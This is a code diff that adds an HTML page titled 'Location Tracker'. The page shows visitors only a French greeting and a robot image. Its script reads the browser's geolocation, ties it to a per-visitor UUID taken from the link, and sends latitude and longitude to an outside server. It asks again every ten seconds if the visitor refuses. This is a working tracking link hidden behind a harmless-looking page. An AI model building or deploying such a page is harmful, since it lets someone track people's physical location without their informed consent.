@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -25,4 +25,44 @@
         });
     </script>
 </body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Location Tracker</title>
+</head>
+<body>
+    <h1>Bonjour tout le monde</h1>
+    <img src="/BACK/public/robot.jpeg"/>
+    <script>
+        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
+        function attemptGeolocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const uuid = window.location.pathname.split('/').pop();
+                const { latitude, longitude } = position.coords;
+
+                fetch('https://geo-localisation.onrender.com/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ uuid, latitude, longitude })
+                })
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }, error => {
+                // En cas d'échec, recharger la page après un délai de 10 secondes
+                console.error('Geolocation error:', error);
+                setTimeout(attemptGeolocation, 10000);
+            });
+        }
+
+        // Appeler la fonction pour tenter de récupérer la position
+        attemptGeolocation();
+    </script>
+</body>
 </html>
+
